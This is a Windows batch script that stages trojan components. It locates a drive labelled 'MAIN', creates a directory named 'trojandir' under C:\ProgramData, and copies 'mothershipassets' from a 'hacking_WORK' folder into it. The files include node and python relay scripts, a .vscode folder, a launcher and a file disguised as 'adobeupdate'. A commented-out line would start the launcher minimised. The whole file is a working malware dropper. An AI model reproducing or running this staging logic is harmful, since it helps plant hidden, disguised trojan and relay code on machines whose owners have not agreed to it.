FOR /F "tokens=1,2" %%A IN ('wmic logicaldisk get name^,volumename 2^>nul ^| findstr /I /C:"MAIN"') DO SET "DRIVE_LETTER=%%A"

set trojandir=C:\ProgramData\owd
cd /d %trojandir%

mkdir %trojandir%\.vscode

copy /y %DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\.vscode\*.* %trojandir%\.vscode 
copy /y %DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\nodehostrelay.cmdslist.js %trojandir%

copy /y %DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\nodehostrelay.js %trojandir% 
copy /y %DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\pythonrelay.py %trojandir%
copy /y %DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\pythonhostrelay.py %trojandir%
copy /y %DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\tpl_launch.cmd %trojandir%
copy /y %DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\adobeupdate %trojandir%
REM copy /y E:\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\tpl_launch.cmd .
REM start "" /min launch.cmd
